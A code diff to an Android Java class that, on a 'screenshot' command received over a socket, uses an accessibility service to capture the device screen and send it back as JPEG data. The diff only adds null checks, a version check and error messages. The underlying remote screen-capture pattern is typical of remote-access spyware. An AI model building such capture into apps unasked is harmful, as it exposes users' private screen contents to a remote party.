@@ -19,13 +19,24 @@ public class ScreenshotEventHandler {
     private final SocketManager socketManager;
 
     public ScreenshotEventHandler(AccessibilityService delegate, SocketManager socketManager) {
+        if (delegate == null) {
+            throw new IllegalArgumentException("AccessibilityService cannot be null");
+        }
+        if (socketManager == null) {
+            throw new IllegalArgumentException("SocketManager cannot be null");
+        }
         this.service = delegate;
         this.socketManager = socketManager;
         this.socketManager.addListener("screenshot", args -> onScreenshotRequestEvent());
     }
 
-    @RequiresApi(api = Build.VERSION_CODES.R)
     public void onScreenshotRequestEvent() {
+        // Check if device supports screenshot functionality
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            socketManager.sendEvent("logger", "Screenshot not supported on this Android version");
+            return;
+        }
+
         try {
             service.takeScreenshot(
                     android.view.Display.DEFAULT_DISPLAY,
@@ -34,29 +45,45 @@ public class ScreenshotEventHandler {
                         @Override
                         public void onSuccess(AccessibilityService.ScreenshotResult result) {
                             try {
+                                if (result == null) {
+                                    socketManager.sendEvent("logger", "Screenshot result is null");
+                                    return;
+                                }
+
                                 HardwareBuffer buffer = result.getHardwareBuffer();
+                                if (buffer == null) {
+                                    socketManager.sendEvent("logger", "HardwareBuffer is null");
+                                    return;
+                                }
+
                                 ColorSpace colorSpace = result.getColorSpace();
                                 if (colorSpace == null) {
                                     colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
                                 }
+
                                 Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
+                                if (bitmap == null) {
+                                    buffer.close();
+                                    socketManager.sendEvent("logger", "Failed to create bitmap from HardwareBuffer");
+                                    return;
+                                }
+
                                 buffer.close();
                                 byte[] imageData = bitmapToJpegBytes(bitmap);
                                 bitmap.recycle();
                                 socketManager.sendEvent("screenshot_response", imageData);
                             } catch (Exception e) {
-                                socketManager.sendEvent("logger", "Error: " + e.getMessage());
+                                socketManager.sendEvent("logger", "Error processing screenshot: " + e.getMessage());
                             }
                         }
 
                         @Override
                         public void onFailure(int error) {
-                            socketManager
-                                    .sendEvent("logger", "Screenshot failed with error code: " + error);
+                            socketManager.sendEvent("logger", "Screenshot failed with error code: " + error);
                         }
                     });
         } catch (Exception e) {
-            socketManager.sendEvent("logger", "Error: " + e.getMessage());
+            socketManager.sendEvent("logger", "Error taking screenshot: " + e.getMessage());
         }
     }
 
